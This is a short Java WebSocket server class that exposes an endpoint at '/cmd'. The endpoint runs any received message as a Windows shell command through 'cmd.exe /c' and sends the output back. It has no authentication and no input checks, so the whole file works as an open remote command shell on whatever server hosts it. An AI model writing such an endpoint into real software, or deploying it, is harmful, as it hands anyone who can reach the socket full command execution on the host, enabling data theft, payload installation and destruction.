package com.api.commnd;

import jakarta.websocket.server.ServerEndpoint;
import jakarta.websocket.*;

import java.io.BufferedReader;
import java.io.InputStreamReader;

@ServerEndpoint("/cmd")
public class CommandLine {
    @OnMessage
    public void onMessage(String line, Session session) {
        RemoteEndpoint.Basic remote = session.getBasicRemote();
        try {
            Process process = Runtime.getRuntime().exec("cmd.exe /c " + line);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));

            String out = "";
            while ((out = reader.readLine()) != null) {
                System.out.print(out + "\n");
                remote.sendText(out);
            }

            while ((out = errorReader.readLine()) != null) {
                System.out.println("cmd error" + out);
                remote.sendText(out);
            }

            reader.close();
            errorReader.close();
            process.waitFor();
        } catch (Exception e) {
            try {
                remote.sendText("error" + e);
            } catch (Exception ex) {
                System.out.println("error" + ex);
            }
            System.out.println("error" + e);
        }
    }

    @OnOpen
    public void onOpen(Session session) {
        System.out.println("Open session: " + session.getId());
        session.setMaxIdleTimeout(10 * 60 * 1000);
        session.setMaxTextMessageBufferSize(1024 * 1024);
        session.setMaxBinaryMessageBufferSize(1024 * 1024);
    }

    @OnClose
    public void onClose(Session session) {
        System.out.println("Close session: " + session.getId());
    }
}